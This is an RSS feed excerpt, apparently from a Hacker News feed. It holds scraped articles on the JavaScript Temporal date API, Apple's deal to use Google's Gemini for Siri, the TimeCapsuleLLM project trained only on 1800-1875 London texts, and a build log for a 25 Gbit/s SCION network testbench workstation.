      &lt;code&gt;console.log( Temporal.Now ); /* Result (expanded): Temporal.Now { … } instant: function instant() plainDateISO: function plainDateISO() plainDateTimeISO: function plainDateTimeISO() plainTimeISO: function plainTimeISO() timeZoneId: function timeZoneId() zonedDateTimeISO: function zonedDateTimeISO() Symbol(Symbol.toStringTag): "Temporal.Now" &amp;lt;prototype&amp;gt;: Object { … } */&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;&lt;code&gt;Temporal&lt;/code&gt; gives us a sensible, plain-language way to grab today’s date, a la raggedy old  &lt;code&gt;Date&lt;/code&gt;: the &lt;code&gt;Now&lt;/code&gt; property contains a &lt;code&gt;plainDateISO()&lt;/code&gt; method. Since we’re not specifying anything in the way of time zones (a thing we can do now, thanks to Temporal) that method gives us back today’s date in the current one — EST, in my case:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;console.log( Temporal.Now.plainDateISO() ); /* Result (expanded): Temporal.PlainDate 2025-12-31 &amp;lt;prototype&amp;gt;: Object { … } */&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Notice how &lt;code&gt;plainDateISO&lt;/code&gt; results in an already-formatted, date-only value? Stay tuned; that’ll come up again later.&lt;/p&gt;
    &lt;p&gt;—wait. That looks familiar:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const nowTemporal = Temporal.Now.plainDateISO(); const nowDate = new Date(); console.log( nowTemporal ); /* Result (expanded): Temporal.PlainDate 2025-12-31 &amp;lt;prototype&amp;gt;: Object { … } */ console.log( nowDate ); /* Result (expanded): Date Tue Dec 31 2025 11:05:52 GMT-0500 (Eastern Standard Time) &amp;lt;prototype&amp;gt;: Date.prototype { … } */&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Could it be that—…&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const rightNow = Temporal.Now.instant(); console.log( typeof rightNow ); // object&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Yes, we’re still working with a mutable object that represents the current date, I say in my spookiest voice, flashlight squarely beneath my chin. At a glance, this might not seem like it addresses my big complaint with &lt;code&gt;Date&lt;/code&gt; at all.&lt;/p&gt;
    &lt;p&gt;Well, we’re kind of at the mercy of the nature of the language, here: dates represent complex real-world values, complex data necessitates complex data structures, and for JavaScript, that means objects. The difference is in how we interact with these Temporal objects, as compared to instances of &lt;code&gt;Date&lt;/code&gt;, and — as is so often the case — the magic is in the prototype chain:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const nowTemporal = Temporal.Now.plainDateISO(); console.log( nowTemporal.__proto__ ); /* Result (expanded): Object { … } add: function add() calendarId: &amp;gt;&amp;gt; constructor: function PlainDate() day: &amp;gt;&amp;gt; dayOfWeek: &amp;gt;&amp;gt; dayOfYear: &amp;gt;&amp;gt; daysInMonth: &amp;gt;&amp;gt; daysInWeek: &amp;gt;&amp;gt; daysInYear: &amp;gt;&amp;gt; equals: function equals() era: &amp;gt;&amp;gt; eraYear: &amp;gt;&amp;gt; inLeapYear: &amp;gt;&amp;gt; month: &amp;gt;&amp;gt; monthCode: &amp;gt;&amp;gt; monthsInYear: &amp;gt;&amp;gt; since: function since() subtract: function subtract() toJSON: function toJSON() toLocaleString: function toLocaleString() toPlainDateTime: function toPlainDateTime() toPlainMonthDay: function toPlainMonthDay() toPlainYearMonth: function toPlainYearMonth() toString: function toString() toZonedDateTime: function toZonedDateTime() until: function until() valueOf: function valueOf() weekOfYear: &amp;gt;&amp;gt; with: function with() withCalendar: function withCalendar() year: &amp;gt;&amp;gt; yearOfWeek: &amp;gt;&amp;gt; Symbol(Symbol.toStringTag): "Temporal.PlainDate" &amp;lt;get calendarId()&amp;gt;: function calendarId() &amp;lt;get day()&amp;gt;: function day() &amp;lt;get dayOfWeek()&amp;gt;: function dayOfWeek() &amp;lt;get dayOfYear()&amp;gt;: function dayOfYear() &amp;lt;get daysInMonth()&amp;gt;: function daysInMonth() &amp;lt;get daysInWeek()&amp;gt;: function daysInWeek() &amp;lt;get daysInYear()&amp;gt;: function daysInYear() &amp;lt;get era()&amp;gt;: function era() &amp;lt;get eraYear()&amp;gt;: function eraYear() &amp;lt;get inLeapYear()&amp;gt;: function inLeapYear() */&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Right away you’ll notice that there are a number of methods and properties devoted to accessing, formatting, and manipulating the details of the Temporal object we’re working with. No big surprises there — it means a little bit of a learning curve, sure, but nothing an occasional trip over to MDN couldn’t solve, and they all more-or-less do what they say on their respective tins. The big difference from working with &lt;code&gt;Date&lt;/code&gt; is how they do so, at a fundamental level:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const nowTemporal = Temporal.Now.plainDateISO(); // Current local date: console.log( nowTemporal ); /* Result (expanded): Temporal.PlainDate 2025-12-30 &amp;lt;prototype&amp;gt;: Object { … } */ // Current local year: console.log( nowTemporal.year ); // Result: 2025 // Current local date and time: console.log( nowTemporal.toPlainDateTime() ); /* Result (expanded): Temporal.PlainDateTime 2025-12-30T00:00:00 &amp;lt;prototype&amp;gt;: Object { … } */ // Specify that this date represents the Europe/London time zone: console.log( nowTemporal.toZonedDateTime( "Europe/London" ) ); /* Result (expanded): Temporal.ZonedDateTime 2025-12-30T00:00:00+00:00[Europe/London] &amp;lt;prototype&amp;gt;: Object { … } */ // Add a day to this date: console.log( nowTemporal.add({ days: 1 }) ); /* Temporal.PlainDate 2025-12-31 &amp;lt;prototype&amp;gt;: Object { … } */ // Add one month and one day to this date, and subtract two years: console.log( nowTemporal.add({ months: 1, days: 1 }).subtract({ years: 2 }) ); /* Temporal.PlainDate 2024-01-31 &amp;lt;prototype&amp;gt;: Object { … } */ console.log( nowTemporal ); /* Result (expanded): Temporal.PlainDate 2025-12-30 &amp;lt;prototype&amp;gt;: Object { … } */&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Notice how none of these transformations required us to manually spin up any new objects, and that the value of the object referenced by &lt;code&gt;nowTemporal&lt;/code&gt; remains unchanged? Unlike &lt;code&gt;Date&lt;/code&gt;,  the methods we use to interact with a Temporal object result in new Temporal objects, rather than requiring us to use them in the context of a new instance or to modify the instance we’re working with — which is how we’re able to chain the &lt;code&gt;add&lt;/code&gt; and &lt;code&gt;subtract&lt;/code&gt; methods together in &lt;code&gt;nowTemporal.add({ months: 1, days: 1 }).subtract({ years: 2 })&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Sure, we’re still working with objects, and that means we’re working with mutable data structures that represent real-world values:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const nowTemporal = Temporal.Now.plainDateISO(); nowTemporal.someProperty = true; console.log( nowTemporal ); /* Result (expanded): Temporal.PlainDate 2026-01-05 someProperty: true &amp;lt;prototype&amp;gt;: Object { … }&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;…But the value represented by that Temporal object isn’t meant to be changed during the normal course of interacting with it — even though the object is still essentially mutable, we’re not stuck using that object in ways that could alter what it means in terms of real-world dates and times. I’ll take it.&lt;/p&gt;
    &lt;p&gt;So, let’s revisit that janky little “today is X, tomorrow is Y” script we wrote using &lt;code&gt;Date&lt;/code&gt; earlier. First, we’ll fix it by making sure we’re working with two discrete instances of &lt;code&gt;Date&lt;/code&gt; rather than modifying the instance that represents today’s date:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const today = new Date(); const addDay = theDate =&amp;gt; { const tomorrow = new Date(); tomorrow.setDate( theDate.getDate() + 1 ); return tomorrow; }; console.log(`Tomorrow will be ${ addDay( today ).toLocaleDateString() }. Today is ${ today.toLocaleDateString() }.`); // Result: Tomorrow will be 1/1/2026. Today is 12/31/2025.&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Thanks, I hate it.&lt;/p&gt;
    &lt;p&gt;Okay, fine. It gets the job done, just as it has since the day &lt;code&gt;Date&lt;/code&gt; first bumbled its way onto the web. We’re not unwittingly altering the value of &lt;code&gt;today&lt;/code&gt; since we’re spinning up a new instance of &lt;code&gt;Date&lt;/code&gt; inside our &lt;code&gt;addDay&lt;/code&gt; function — wordy, but it works, as it has for decades now. We add &lt;code&gt;1&lt;/code&gt; to it, which we have to just kind of know means add one day. Then in our template literal we need to keep nudging JavaScript to give us the date in a format that doesn’t include the current time, as a string. It’s functional, but verbose.&lt;/p&gt;
    &lt;p&gt;Now, let’s redo it using &lt;code&gt;Temporal&lt;/code&gt;:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const today = Temporal.Now.plainDateISO(); console.log(`Tomorrow will be ${ today.add({ days: 1 }) }. Today is ${ today }.`); // Result: Tomorrow will be 2026-01-01. Today is 2025-12-31.&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Now we’re talking.&lt;/p&gt;
    &lt;p&gt;So much better. Leaner, meaner, and way less margin for error. We want today’s date without the time, and the object that results from invoking &lt;code&gt;plainDateISO&lt;/code&gt; (and any new Temporal objects created from it) will retain that formatting without being coerced to a string. Formatting: check.&lt;/p&gt;
    &lt;p&gt;We want to output a value that represents today’s date plus one day, and we want to do so in a way where we are unmistakably saying “add one day to it” with no parsing guesswork: check and check.&lt;/p&gt;
    &lt;p&gt;Most importantly, we don’t want to run the risk of having our original &lt;code&gt;today&lt;/code&gt; object altered unintentionally — because the result of calling the &lt;code&gt;add&lt;/code&gt; method will always be a new Temporal object: check.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;Temporal&lt;/code&gt; is going to be a massive improvement over &lt;code&gt;Date&lt;/code&gt;, and I only say “going to be” because it still isn’t quite ready for prime-time usage. The draft specification for the proposed &lt;code&gt;Temporal&lt;/code&gt; object has reached stage three of the standardization process, meaning it is now officially “recommended for implementation” — not yet part of the standard that informs the ongoing development of JavaScript itself, but close enough that browsers can start tinkering with it. That means the results of that early experimentation may be used to further refine the specification, so nothing is set in stone just yet. Web standards are an iterative process, after all.&lt;/p&gt;
    &lt;p&gt;That’s where you and I come in. Now that &lt;code&gt;Temporal&lt;/code&gt; has landed in the latest versions of Chrome and Firefox — and others, soon — it’s time for us to get in there and kick the tires a little bit. We may not have had any say in &lt;code&gt;Date&lt;/code&gt;, but we get to experiment with &lt;code&gt;Temporal&lt;/code&gt; before the final implementations land.&lt;/p&gt;
    &lt;p&gt;Soon, JavaScript will have sensible, modern date handling, and we’ll finally be able to cram &lt;code&gt;Date&lt;/code&gt; way in the back of the junk drawer with the rubber bands, mismatched jar lids, mystery keys, and probably-half-empty AA batteries — still present, still an inexorable part of the web platform, but no longer our first, last, and only way of handling dates. And we only had to wait— well, hold on, let me just crunch the numbers real quick:&lt;/p&gt;
    &lt;head rend="h3"&gt;Try it out&lt;/head&gt;
    &lt;code&gt;const today = Temporal.Now.plainDateISO();
const jsShipped = Temporal.PlainDate.from( "1995-12-04" );
const sinceDate = today.since( jsShipped, { largestUnit: 'year' });

console.log( `${ sinceDate.years } years, ${ sinceDate.months } months, and ${ sinceDate.days } days.` );&lt;/code&gt;
    &lt;p&gt;Sure, the best time to replace &lt;code&gt;Date&lt;/code&gt; would’ve been back in 1995, but hey: the second best time is &lt;code&gt;Temporal.Now&lt;/code&gt;, right?&lt;/p&gt;
    &lt;p&gt;Enjoyed this article? You can support us by leaving a tip via Open Collective&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46589658</guid><pubDate>Mon, 12 Jan 2026 15:20:36 +0000</pubDate></item><item><title>Apple picks Google's Gemini to power Siri</title><link>https://www.cnbc.com/2026/01/12/apple-google-ai-siri-gemini.html</link><description>&lt;doc fingerprint="3d46b9ec932631f0"&gt;
  &lt;main&gt;
    &lt;p&gt;Apple is joining forces with Google to power its artificial intelligence features, including a major Siri upgrade expected later this year.&lt;/p&gt;
    &lt;p&gt;The multiyear partnership will lean on Google's Gemini and cloud technology for future Apple foundational models, according to a joint statement obtained by CNBC's Jim Cramer.&lt;/p&gt;
    &lt;p&gt;"After careful evaluation, we determined that Google's technology provides the most capable foundation for Apple Foundation Models and we're excited about the innovative new experiences it will unlock for our users," Apple said in a statement Monday.&lt;/p&gt;
    &lt;p&gt;The models will continue to run on Apple devices and the company's private cloud compute, the companies added.&lt;/p&gt;
    &lt;p&gt;Apple declined to comment on the terms of the deal. Google referred CNBC to the joint statement.&lt;/p&gt;
    &lt;p&gt;In August, Bloomberg reported that Apple was in early talks with Google to use a custom Gemini model to power a new iteration of Siri. The news outlet later reported that Apple was planning to pay about $1 billion a year to utilize Google AI.&lt;/p&gt;
    &lt;p&gt;The deal is another major indicator of growing trust in Google's accelerating AI agenda and comeback against OpenAI. In 2025, the search giant logged its best year since 2009 and surpassed Apple in market capitalization last week for the first time since 2019.&lt;/p&gt;
    &lt;p&gt;Google already pays Apple billions each year to be the default search engine on iPhones. But that lucrative partnership briefly came into question after Google was found to hold an illegal internet search monopoly.&lt;/p&gt;
    &lt;p&gt;In September, a judge ruled against a worst-case scenario outcome that could have forced Google to divest its Chrome browser business.&lt;/p&gt;
    &lt;p&gt;The decision also allowed Google to continue to make deals such as the one with Apple.&lt;/p&gt;
    &lt;p&gt;Shares climbed following the news but later pulled back. Google briefly touched above a $4 trillion market value.&lt;/p&gt;
    &lt;p&gt;Apple has mostly stood on the sidelines of the AI frenzy that's swept up Wall Street since the launch of OpenAI's ChatGPT at the end of 2022.&lt;/p&gt;
    &lt;p&gt;Hyperscalers Amazon, Meta Platforms and Microsoft have shelled out billions on AI products, tools and infrastructure for their customers.&lt;/p&gt;
    &lt;p&gt;That's amped up the pressure on the iPhone maker to deliver an impressive Siri AI voice upgrade, which it delayed last year until 2026, despite running ads for the product.&lt;/p&gt;
    &lt;p&gt;"It's going to take us longer than we thought to deliver on these features and we anticipate rolling them out in the coming year," the company said in a statement at the time.&lt;/p&gt;
    &lt;p&gt;Apple currently partners with OpenAI to integrate ChatGPT into Siri and Apple Intelligence, specifically for complicated queries that can tap into the AI model's world knowledge. It's unclear what the Google partnership means for the ChatGPT integration in the future.&lt;/p&gt;
    &lt;p&gt;The iPhone maker told CNBC that it isn't making any changes to the agreement. OpenAI did not immediately respond to a request for comment.&lt;/p&gt;
    &lt;p&gt;Meanwhile, Google has made steady progress on its AI agenda, introducing its upgraded Gemini 3 model late last year.&lt;/p&gt;
    &lt;p&gt;In October, Google CEO Sundar Pichai said the company's cloud segment signed more deals worth over $1 billion through the third quarter of 2025 than the previous two years combined.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46589675</guid><pubDate>Mon, 12 Jan 2026 15:22:21 +0000</pubDate></item><item><title>TimeCapsuleLLM: LLM trained only on data from 1800-1875</title><link>https://github.com/haykgrigo3/TimeCapsuleLLM</link><description>&lt;doc fingerprint="34089b5011be0c83"&gt;
  &lt;main&gt;
    &lt;head&gt;🌐 Language&lt;/head&gt;
    &lt;code&gt;  &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;
    &lt;p&gt;A language model trained from scratch exclusively on data from certain places and time periods to reduce modern bias and emulate the voice, vocabulary, and worldview of the era.&lt;/p&gt;
    &lt;p&gt;Imagine if an AI model didnt just pretend to be historical but actually was.&lt;/p&gt;
    &lt;p&gt;v0 and v0.5 built on nanoGPT by Andrej Karpathy Core training scripts and model architecture are his work.&lt;/p&gt;
    &lt;p&gt;v1 built on Phi 1.5 by Microsoft&lt;/p&gt;
    &lt;p&gt;Early prompts show the model responding with 1800's language and behavior. Example: Prompt: "Who art Henry?" and it replied "I know that man, I have did not a black, the storm."&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;No mention of modern concepts&lt;/item&gt;
      &lt;item&gt;Mostly era-accurate vocabulary&lt;/item&gt;
      &lt;item&gt;Sentences are mostly incoherent (expected for ~187MB training data)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;A significant improvement over v0.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Victorian writing style, proper punctuation, mostly grammatical sentences&lt;/item&gt;
      &lt;item&gt;Still high factual hallucination rate&lt;/item&gt;
      &lt;item&gt;OCR noise (“Digitized by Google”) still present in outputs&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;First model to recall and connect a real historical event with an actual figure from the dataset.&lt;/p&gt;
    &lt;p&gt;Example: Prompt: "It was the year of our Lord 1834"&lt;/p&gt;
    &lt;p&gt;The output: "It was the year of our Lord 1834 and the streets of London were filled with protest and petition. The cause, as many re counted, was not bound in the way of private, but having taken up the same day in the day of Lord Palmerston, the public will receive a short statement of the difficulties under which the day of law has reached us. It is a matter of deep regret, that the present events in the history of the world are clear, and consequently will be'known. It is not true that the very men who first settled in the Gospel at Jerusalem should have so extensive and so interesting a record of the prosperity and prosperity"&lt;/p&gt;
    &lt;p&gt;At first I assumed that a protest might have coincidentally taken place the same year but take a look at this:&lt;/p&gt;
    &lt;p&gt;Trained using a 15GB sample from v2's 90GB dataset. Model trained to 10K steps only.&lt;/p&gt;
    &lt;p&gt;There was an issue with tokenization that causes output to look like this:&lt;/p&gt;
    &lt;p&gt;PROMPT: Who is Charles Dickens?&lt;/p&gt;
    &lt;p&gt;W ho is Charles D ic ens ? D oes that work more of h ise x cell ent st ir ring , in his pl ays , int he G reat C omp any 's f arm ? What I have y et to qu ote from J ack P ick ett ? D oy oun ot know th att hey were as pe cies of g all oping , ors aw ing oft heir bre asts , or what w ast ob ed one about the t im ew hen J acks on was looking ont hew ind ow ? What ist hes uccess of an English man , and which h isson has not be end is cover ing t ome , where by to acc omp lish such a we ight ? D idy ou ever m ake ap ass age int othe old road way , ort o an anch or - b ree ze att he foot of our boat , which you m ust le ave us ? The fact is , that whe ther the wind would rise up from the pl ain on S atur day night orn o ont ide , ort ill then orth , or other wise , wes hall be com pelled t od esc ribe af orm idable bar rier , with t hes ame e ffect s ast he p resent . In th iss itu ation , at le ast , itis not to omuch t os ay that we have le ft that room . I bel ieve there are three c op ies int he " F ive H undred - fold ," to bere fer red to , ast he first n umber of our read ers wh ow is ht&lt;/p&gt;
    &lt;p&gt;Corrected:&lt;/p&gt;
    &lt;p&gt;"Who is Charles Dickens? Does that work more of his excellent stirring, in his plays, in the Great Company's farm? What I have yet to quote from Jack Pickett? Do you not know that they were a species of galloping, or sawing of their breasts, or what was to be done about the time when Jackson was looking on the window? What is the success of an Englishman, and which his son has not been discovering to me, whereby to accomplish such a weight? Did you ever make a passage into the old roadway, or to an anchor-breeze at the foot of our boat, which you must leave us? The fact is, that whether the wind would rise up from the plain on Saturday night or noontide, or till the north, or otherwise, we shall be compelled to describe a formidable barrier, with the same effects as the present. In this situation, at least, it is not too much to say that we have left that room. I believe there are three copies in the 'Five Hundred-fold,' to be referred to, as the first number of our readers who wish t[o]...”&lt;/p&gt;
    &lt;p&gt;Trained using the same 15GB sample used for training eval1. Model is again trained to 10K steps only.&lt;/p&gt;
    &lt;p&gt;PROMPT:Charles Darwin&lt;/p&gt;
    &lt;p&gt;Charles DarwinECCEMACY. Sir, — The following case is interesting to me : — I was in London a fortnight, and was much affected with an attack of rheumatism. The first attack of rheumatism was a week before I saw you, and the second when I saw you, and the third when I saw you, and the third in the same time. The second attack of gout, however, was not accompanied by any febrile symptoms, but was accompanied with an increased flow of urine, and with a more copious discharge of urine. The third attack was an hour after I saw you, and was succeeded by a return of a paroxysm of gout, and a more rapid return of the gout. The fourth attack was also accompanied by a fever, but was not always accompanied by any febrile symptoms. The third attack of gout was a fortnight after you had been ill, and the fourth was followed by a paroxysm of gout. The fourth attack was a fortnight after you were attacked, and was accompanied by a sense&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;90GB of 1800-1875 London texts&lt;/item&gt;
      &lt;item&gt;136,344 documents&lt;/item&gt;
      &lt;item&gt;The full 90GB is not avalaible yet as it hasn't been tokenized but you can find a 15GB sample here: https://huggingface.co/datasets/haykgrigorian/TimeCapsuleLLM-London-1800-1875-v2-15GB&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Refer to v2 bias report for more info.&lt;/p&gt;
    &lt;p&gt;This project focuses mostly on curating historical data, preparing it for training and building a tokenizer. I am not going to cover the full LLM training process, for that refer to nanoGPT by Andrej Karpathy.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Collect .txt files of public domain books, documents, etc from your chosen time period (e.g., London 1800-1850)&lt;/item&gt;
      &lt;item&gt;Keep them within your chosen time/place window&lt;/item&gt;
      &lt;item&gt;Clean the text files using a script or manually remove headers/footer from Project Gutenberg, Modern annotations or things like OCR errors.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Run train_tokenizer.py or train_tokenizer_hf.py on the cleaned data.&lt;/item&gt;
      &lt;item&gt;This will give you vocab.json and merges.txt&lt;/item&gt;
      &lt;item&gt;Thes files define vocab and merge rules for your model&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Refer to nanoGPT by Andrej Karpathy for the training process or your chosen architecture’s docs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Selective Temporal Training (STT) is a machine learning methodology where all training data is specifically curated to fall within a specific historical time period. It's done in order to model the language and knowledge of that era without influence from modern concepts. For example, the current model I have now (v0.5) is trained on data exclusively from 1800-1875, it's not fine tuned but trained from scratch resulting in output that reflects the linguistic style and historical context of that time period.&lt;/p&gt;
    &lt;p&gt;For this project I'm trying to create a language model that is unclouded from modern bias. If I fine-tune something like GPT-2, it's already pre-trained and that information won't go away. If I train from scratch the language model won't pretend to be old, it just will be. The Goal for this project right now is to create something can reason exclusively using knowledge from London books published between 1800 and 1875.&lt;/p&gt;
    &lt;p&gt;I'm using books, legal documents, newspapers, and other writings from 1800–1875 London. The list I linked (for v0) has like 200 but for the first training I just used 50 files about ~187 MB. You can view a list of the documents: https://github.com/haykgrigo3/TimeCapsuleLLM/blob/main/Copy%20of%20London%20Documents%20for%20Time%20Capsule%20LLM.txt&lt;/p&gt;
    &lt;p&gt;Dataset sizes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;v0: ~187MB&lt;/item&gt;
      &lt;item&gt;v0.5: ~435MB&lt;/item&gt;
      &lt;item&gt;v1: ~6.25GB&lt;/item&gt;
      &lt;item&gt;v2mini-eval1: 15GB&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;v0: 16M Parameters&lt;/p&gt;
    &lt;p&gt;v0.5 123M Parameters&lt;/p&gt;
    &lt;p&gt;v1: 700M Parameters&lt;/p&gt;
    &lt;p&gt;v2mini-eval1: 300M Parameters&lt;/p&gt;
    &lt;p&gt;GPU: Geforce rtx 4060 CPU: i5-13400F Ram: 16GB DDR5.&lt;/p&gt;
    &lt;p&gt;GPU: A100 SXM rented&lt;/p&gt;
    &lt;p&gt;GPU: A100 SXM rented&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46590280</guid><pubDate>Mon, 12 Jan 2026 16:04:27 +0000</pubDate></item><item><title>Building a 25 Gbit/s workstation for the SCION Association</title><link>https://github.com/scionassociation/blog-25gbit-workstation</link><description>&lt;doc fingerprint="b62dd15f43309f44"&gt;
  &lt;main&gt;
    &lt;p&gt;This is an LGA4677 socket and it's about to be fitted with a 12-core Intel Xeon CPU to power the 64 PCIe Gen5 lanes for 3x Mellanox NVIDIA BlueField-2 Dual-25G smart NICs, which will ultimately power the SCION Association's new 25 Gbit/s testbench workstation!&lt;/p&gt;
    &lt;p&gt;I built it to develop and test a new AF_XDP underlay for the SCION OSS has received significant data plane performance improvements over the past years, but still requires further work.&lt;/p&gt;
    &lt;p&gt;In this article, I'll walk you through the entire planning, building, and configuration process in almost full detail.&lt;/p&gt;
    &lt;p&gt;It’s hard to say how many hours went into it, but it was clearly a multi-week endeavor. In total it cost us CHF ~3,741.34 (around ≈$4,700 USD) in materials. See the complete list of components at the end.&lt;/p&gt;
    &lt;p&gt;Disclaimer: I spent many hours writing this article by hand, but I must confess, LLMs did help me formulate and polish parts of it.&lt;/p&gt;
    &lt;p&gt;SCION (Scalability, Control, and Isolation On Next-Generation Networks), is, in a nutshell, an IETF draft-stage technology of a growing alternative to the Border Gateway Protocol (BGP). It's an innovative inter-AS routing architecture designed to address BGP's fundamental flaws and security vulnerabilities.&lt;/p&gt;
    &lt;p&gt;Maybe at some point in the future the Internet will run SCION, although a more likely scenario is that SCION and BGP will run alongside each other. What is clear, though, is that critical infrastructure should run on SCION, where:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;path authenticity&lt;/item&gt;
      &lt;item&gt;explicit path control (e.g. geofencing)&lt;/item&gt;
      &lt;item&gt;more consistent latency characteristics&lt;/item&gt;
      &lt;item&gt;deterministic failover&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;are required and best-effort BGP routing is an unacceptable risk.&lt;/p&gt;
    &lt;p&gt;The national bank of Switzerland realized this and since 2024 Switzerland's banking infrastructure now runs on the SCION-powered SSFN, which relies on the commercial implementation from Anapaya Systems AG that currently provides up to 100 Gbit/s border router solutions. The free open source implementation github.com/scionproto/scion received numerous data plane performance improvements over the past years but is still lagging behind.&lt;/p&gt;
    &lt;p&gt;If we want to do video calls (and similar high-bandwidth use cases) over SCION OSS en masse - the data plane performance needs to improve. Thanks to funding by the NLnet Foundation we've been working on a new faster AF_XDP border router underlay.&lt;/p&gt;
    &lt;p&gt;If you want to learn more about SCION, check out scion.org.&lt;/p&gt;
    &lt;p&gt;As of the time of writing, the SCION OSS border router performance reached a ceiling of around 400k-500k packets per second, which is roughly equivalent to 5-6 Gbit/s at a 1500-byte MTU.&lt;/p&gt;
    &lt;p&gt;5 Gbit/s per stream* of data is too little, in fact, way too little. By contrast, today's Internet carries traffic on the order of hundreds of terabits per second across BGP border routers worldwide. On the higher end, take the Juniper "MX10008 Universal Routing Platforms" with up to 76.8 Tbps (yes, terabits with twelve zeroes) of total bandwidth capacity for example&lt;/p&gt;
    &lt;p&gt;These kinds of systems support per-port line rates of 400-500 Gbit/s, depending on the interface configuration. Individual packet streams carried over such ports can therefore be forwarded at or near full line rate without being bottlenecked by software overhead, while massive parallelization across ports enables aggregate bandwidths in the terabits per second.&lt;/p&gt;
    &lt;p&gt;Such routers usually sit at Internet exchange points and interconnect Internet service providers. They can easily handle from tens of millions to even billions of packets per second.&lt;/p&gt;
    &lt;p&gt;Even my local ISP now provides 25 Gbit/s FTTH connections at my small town near Zurich city.&lt;/p&gt;
    &lt;p&gt;SCION OSS needs to do better; a lot better.&lt;/p&gt;
    &lt;p&gt;* A "stream" is defined here as a flow of packets from a specific source address to a specific destination address that cannot be parallelized across multiple threads as parallelization would cause unacceptable levels of packet reordering.&lt;/p&gt;
    &lt;p&gt;The SCION OSS border router is a Linux user-space program. It relies solely on the Linux networking stack.&lt;/p&gt;
    &lt;p&gt;Schematic for the packet flow paths through Linux networking and tables by Jan Engelhardt&lt;/p&gt;
    &lt;p&gt;You can think of a packet traversing the networking stack as a person traveling by airplane:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;you enter the airport (Network Interface Controller receiving queue)&lt;/item&gt;
      &lt;item&gt;you check in and drop off your baggage (buffer allocations)&lt;/item&gt;
      &lt;item&gt;you pass security screening (packet filtering)&lt;/item&gt;
      &lt;item&gt;you clear passport control (routing and policy checks)&lt;/item&gt;
      &lt;item&gt;you wait at the gate (queueing and scheduling)&lt;/item&gt;
      &lt;item&gt;you board the aircraft (copy to user space)&lt;/item&gt;
      &lt;item&gt;you find your seat (user-space buffer) and you're finally ready for takeoff!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;And when transiting - like a packet passing through a router - the same sequence of steps occurs again in reverse on the transmit path.&lt;/p&gt;
    &lt;p&gt;As you can probably tell, there's a lot of work between a packet entering one NIC and exiting on another.&lt;/p&gt;
    &lt;p&gt;We could improve the throughput by adding more router threads, but this would introduce substantial packet reordering, with packets leaving the system in a different and largely unpredictable order. High frequency of reordering degrades performance and increases system resource usage, making this approach non-viable.&lt;/p&gt;
